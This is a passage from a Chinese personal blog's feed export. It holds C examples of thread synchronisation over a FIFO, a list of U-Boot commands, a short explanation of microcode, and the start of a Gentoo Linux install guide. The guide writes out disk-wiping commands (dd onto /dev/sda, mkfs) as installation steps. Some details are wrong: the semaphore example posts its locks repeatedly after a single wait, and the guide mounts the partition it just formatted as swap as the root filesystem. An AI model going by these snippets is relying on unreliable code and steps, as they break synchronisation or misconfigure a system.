class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fifo <span class="hljs-string">&quot;/tmp/myfifo&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> string <span class="hljs-string">&quot;myhelloworld&quot;</span></span><br><br><span class="hljs-type">int</span> fd = <span class="hljs-number">0</span>;<br><span class="hljs-type">sem_t</span> full, avail, mutex;<span class="hljs-comment">//初始化三个全局信号量</span><br><span class="hljs-comment">//生产者线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    sem_wait(&amp;avail);<br>    sem_wait(&amp;mutex);<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        ret = write(fd, <span class="hljs-built_in">string</span>, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nwrite string to fifo file successful!\n&quot;</span>);<br>        sem_post(&amp;full);<br>        sem_post(&amp;mutex);<br>        sleep(<span class="hljs-number">1</span>);<br>        i++;<br>    &#125;<br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">//消费则线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    sem_wait(&amp;full);<br>    sem_wait(&amp;mutex);<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> buffer[stringlen];<br>    bzero(buffer, stringlen);<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        ret = read(fd, buffer, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo:%s\n&quot;</span>, buffer);<br>        bzero(buffer, stringlen);<br>        i++;<br>        sleep(<span class="hljs-number">1</span>);<br>        sem_post(&amp;avail);<br>        sem_post(&amp;mutex);<br>    &#125;<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span> (F_OK == access(fifo, <span class="hljs-number">0</span>)) &#123;<br>        unlink(fifo);<br>    &#125;<br>    ret = mkfifo(fifo, <span class="hljs-number">0666</span>);<br>    fd = open(fifo, O_RDWR);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;mkfifo&quot;</span>);<br>    &#125;<br>    ret = sem_init(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + sem_init(&amp;avail, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) + sem_init(&amp;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;semphore init failed!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">pthread_t</span> threadid[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//创建两个线程</span><br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, producer, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, consumer, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">//等待两个线程结束</span><br>    pthread_join(threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>);<br>    pthread_join(threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-使用线程互斥锁实现线程同步"><a href="#2-使用线程互斥锁实现线程同步" class="headerlink" title="2.使用线程互斥锁实现线程同步"></a>2.使用线程互斥锁实现线程同步</h3><h4 id="使用的api-1"><a href="#使用的api-1" class="headerlink" title="使用的api"></a>使用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> 线程互斥锁类型<br>pthread_mutex_lock(<span class="hljs-type">pthread_mutex_t</span> *mutex);<br>pthread_mutex_unlock(<span class="hljs-type">pthread_mutex_t</span> *mutex);<br></code></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-comment">//定义两个宏,一个用于表示fifo文件的路径,一个用于表示向fifo文件中写入的字符串</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fifo <span class="hljs-string">&quot;/tmp/myfifo&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> string <span class="hljs-string">&quot;myhelloworld&quot;</span></span><br><br><span class="hljs-type">int</span> fd = <span class="hljs-number">-1</span>;<br><span class="hljs-type">pthread_mutex_t</span> mutex;<br><br><span class="hljs-comment">//生产者线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">p_operation</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        <span class="hljs-comment">//获得线程锁</span><br>        pthread_mutex_lock(&amp;mutex);<br>        ret = write(fd, <span class="hljs-built_in">string</span>, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file successful!\n&quot;</span>);<br><span class="hljs-comment">//释放线程锁</span><br>        pthread_mutex_unlock(&amp;mutex);<br>        sleep(<span class="hljs-number">1</span>);<br>        i++;<br>    &#125;<br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">//消费则线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">v_operation</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> buffer[stringlen];<br>    bzero(buffer, stringlen);<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        pthread_mutex_lock(&amp;mutex);<br>        <span class="hljs-comment">//获得线程互斥锁</span><br>        ret = read(fd, buffer, stringlen);<br>        <span class="hljs-keyword">if</span> (ret == stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo:%s\n&quot;</span>, buffer);<br>            bzero(buffer, stringlen);<br>            i++;<br>        &#125;<br>        pthread_mutex_unlock(&amp;mutex);<br>        <span class="hljs-comment">//释放线程互斥锁</span><br>    &#125;<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span> (F_OK == access(fifo, <span class="hljs-number">0</span>)) &#123;<br>        unlink(fifo);<br>    &#125;<br>    ret = mkfifo(fifo, <span class="hljs-number">0666</span>);<br>    fd = open(fifo, O_RDWR);<br>    <span class="hljs-comment">//将文件描述符设为非阻塞，防止出现死锁(如果没有设置非阻塞,可能会出现一个线程等待数据的到来,而另一个线程在等待线程锁的释放,造成死锁)</span><br>    <span class="hljs-type">int</span> flag = fcntl(fd, F_GETFL);<br>    fcntl(fd, F_SETFL, flag | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;mkfifo&quot;</span>);<br>    &#125;<br>    pthread_mutex_init(&amp;mutex, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">pthread_t</span> threadid[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//创建两个线程</span><br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, p_operation, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, v_operation, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">//等待两个线程结束</span><br>    pthread_join(threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>);<br>    pthread_join(threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//销毁线程锁</span><br>    pthread_mutex_destroy(&amp;mutex);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>嵌入式开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uboot基本命令</title>
    <link href="/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="uboot基本命令"><a href="#uboot基本命令" class="headerlink" title="uboot基本命令"></a>uboot基本命令</h1><h2 id="什么是uboot？"><a href="#什么是uboot？" class="headerlink" title="什么是uboot？"></a>什么是uboot？</h2><p>uboot一个嵌入式领域常用的一种bootloader,支持多种计算机架构,如ARM,PPC,MIPS,</p><h2 id="为什么用uboot"><a href="#为什么用uboot" class="headerlink" title="为什么用uboot?"></a>为什么用uboot?</h2><ul><li>1.开放源码</li><li>2.支持多种嵌入式操作系统内核，如Linux、NetBSD, VxWorks, QNX, RTEMS, ARTOS, LynxOS, android</li><li>3.支持多个处理器系列，如PowerPC、ARM、x86、MIPS</li><li>4.较高的可靠性和稳定性</li><li>5.高度灵活的功能设置,适合U-Boot调试、操作系统不同引导要求、产品发布等</li><li>6.丰富的设备驱动源码，如串口、以太网、SDRAM、FLASH、LCD、NVRAM、EEPROM、RTC、键盘等</li><li>7.较为丰富的开发调试文档与强大的网络技术支持</li></ul><h2 id="uboot常用命令"><a href="#uboot常用命令" class="headerlink" title="uboot常用命令"></a>uboot常用命令</h2><h4 id="1-修改或查看内存命令"><a href="#1-修改或查看内存命令" class="headerlink" title="1.修改或查看内存命令"></a>1.修改或查看内存命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.md[.b,.w,.l] address count(查看内存中的数据)<br>2.nm[.b,.w,.l] address(修改内存中的值)<br>3.mm[.b,.w,.l] address(修改内存中的值,并且他会自增,输入q会退出)<br>4.mw[.b,.w,.l] address value [count](修改内存中的值)<br>5.<span class="hljs-built_in">cp</span>[.b,.w,.l] srcaddress value [count](拷贝内存中的值)<br>6.cmp[.b,.w,.l] addr1 addr2 count(对比两块内存中的值)<br></code></pre></td></tr></table></figure><h4 id="2-读取命令"><a href="#2-读取命令" class="headerlink" title="2.读取命令"></a>2.读取命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.fatinfo &lt;interface&gt; dev:part (显示分区信息)<br>2.fatls &lt;interface&gt; dev:part directory(列出某个目录的文件或者是目录)<br>3.fatload &lt;interface&gt; address dev:part file (将一个文件从磁盘分区读取到内存)<br>以上命令都是针对于fat文件系统分区的操作<br></code></pre></td></tr></table></figure><h4 id="3-设置环境变量"><a href="#3-设置环境变量" class="headerlink" title="3.设置环境变量"></a>3.设置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printenv</span>(显示当前环境变量)<br>setenv name value(设置环境变量)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>嵌入式开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置和使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是microcode?</title>
    <link href="/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/"/>
    <url>/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是microcode"><a href="#什么是microcode" class="headerlink" title="什么是microcode?"></a>什么是microcode?</h1><h4 id="cpu执行指令的步骤一般为"><a href="#cpu执行指令的步骤一般为" class="headerlink" title="cpu执行指令的步骤一般为"></a>cpu执行指令的步骤一般为</h4><ul><li>1.取指令</li><li>2.指令译码</li><li>3.指令执行</li><li>4.结果写回</li></ul><p>由上述步骤我们知道,cpu在执行二进制代码的时候需要对指令进行译码才能够执行  </p><h3 id="cpu译码的开始"><a href="#cpu译码的开始" class="headerlink" title="cpu译码的开始"></a>cpu译码的开始</h3><p>在译码开始时,程序的指令和数据分别会放到一级指令缓存(L1 cache),和数据一级缓存中,(只有L1 cache才是唯一指令和数据单独分割的cache),然后指令一级缓存中的指令会进入解码器,然后才是指令执行的开始</p><h3 id="cpu如何认识并指令指令"><a href="#cpu如何认识并指令指令" class="headerlink" title="cpu如何认识并指令指令"></a>cpu如何认识并指令指令</h3><h4 id="cpu译码器-Instuction-Decode-Unit-IDU"><a href="#cpu译码器-Instuction-Decode-Unit-IDU" class="headerlink" title="cpu译码器(Instuction Decode Unit(IDU))"></a>cpu译码器(Instuction Decode Unit(IDU))</h4><p>cpu译码器一般分为两种</p><ul><li>1.硬件指令译码器</li><li>2.微码指令译码器</li></ul><p>现在我们使用的计算机一般是X86架构,属于CISC(复杂指令集),指令种类繁多,如果所有的解码都通过硬件来完成,将会大幅增加硬件布线的难度,因此一般cpu在设计的时候一般只会对一些少量基本的指令采用硬件解码的方式,而一些复杂的指令采用微码指令译码器将其拆解为多条精简指令(microcode),因此cpu只有microcode才是基本的执行单位,硬件解码完成后,将会被cpu调度器(scheduler)放入pipeline提高指令的并行性</p><h3 id="microcode如何修复"><a href="#microcode如何修复" class="headerlink" title="microcode如何修复"></a>microcode如何修复</h3><p>我们知道,一条复杂指令要通过microcode译码器分解为多条microcode才能够被cpu所执行,原始的microcode来自于一块rom,为了microcode,新设计了一块较小的SRAM,用来为该rom上的microcode打补丁Microcode更新通常通过更新BIOS来更新</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gentoolinux安装步骤</title>
    <link href="/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Gentoolinux安装步骤"><a href="#Gentoolinux安装步骤" class="headerlink" title="Gentoolinux安装步骤"></a>Gentoolinux安装步骤</h1><h2 id="1-基本文件的获取"><a href="#1-基本文件的获取" class="headerlink" title="1.基本文件的获取"></a>1.基本文件的获取</h2><ul><li>1.获取livecd<br>livecd可以使用Gentoo官方提供的livecd或者其他livecd</li><li>2.获取stage<br>stage3分为两种,一种是以systemd作为init程序,一种是以openrc做为init程序(Gentoo官方是推荐openrc)</li></ul><h2 id="2-光盘刻录"><a href="#2-光盘刻录" class="headerlink" title="2.光盘刻录"></a>2.光盘刻录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#linux用户可以使用dd</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/***.iso of=/dev/sda<br></code></pre></td></tr></table></figure><h2 id="3-磁盘分区和挂载"><a href="#3-磁盘分区和挂载" class="headerlink" title="3.磁盘分区和挂载"></a>3.磁盘分区和挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#磁盘分区</span><br>fdisk /dev/sda<br><br><span class="hljs-comment">#磁盘格式化</span><br><br><span class="hljs-comment">#boot分区</span><br>mkfs.vfat /dev/sda1<br><br><span class="hljs-comment">#swap分区(如果内存足够可以不使用swap)</span><br>mkswap /dev/sda2<br><br><span class="hljs-comment">#根分区</span><br>mkfs.ext4 /dev/sda3<br><br><span class="hljs-comment">#分区挂载</span><br><span class="hljs-built_in">mkdir</span> /mnt/gentoo<br>mount /dev/sda2 /mnt/gentoo<br></code></pre></td></tr></table></figure><h2 id="4-解压stage包"><a href="#4-解压stage包" class="headerlink" title="4.解压stage包"></a>4.解压stage包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取Gentoo stage3包</span><br>wget https://bouncer.gentoo.org/fetch/root/all/releases/amd64/autobuilds/20220109T170538Z/stage3-amd64-systemd-20220109T170538Z.tar.xz<br>tar -Jxf stage3-amd64-systemd-20220109T170538Z.tar.xz -C /mnt/gentoo<br><br><span class="hljs-comment">#将之前格式化的boot磁盘挂载</span><br>mount /dev/sda1 /mnt/gentoo/boot<br></code></pre></td></tr></table></figure><h2 id="5-安装环境配置"><a href="#5-安装环境配置" class="headerlink" title="5.安装环境配置"></a>5.安装环境配置</h2><h3 id="5-1-挂载必要的文件系统"><a href="#5-1-挂载必要的文件系统" class="headerlink" title="5.1.挂载必要的文件系统"></a>5.1.挂载必要的文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置dns解析文件</span><br><span class="hljs-built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/resolv.conf<br><br>mount --types proc /proc /mnt/gentoo/proc<br>mount --rbind /sys /mnt/gentoo/sys<br>mount --make-rslave /mnt/gentoo/sys<br>mount --rbind /dev /mnt/gentoo/dev<br>mount --make-rslave /mnt/gentoo/dev<br><span class="hljs-comment">#假如用的不是gentoo的livecd,需要加入以下</span><br><span class="hljs-built_in">test</span> -L /dev/shm &amp;&amp; <span class="hljs-built_in">rm</span> /dev/shm &amp;&amp; <span class="hljs-built_in">mkdir</span> /dev/shm<br>mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm<br><span class="hljs-built_in">chmod</span> 1777 /dev/shm<br></code></pre></td></tr></table></figure><h3 id="5-2-进入到新的系统进行基本系统配置"><a href="#5-2-进入到新的系统进行基本系统配置" class="headerlink" title="5.2.进入到新的系统进行基本系统配置"></a>5.2.进入到新的系统进行基本系统配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 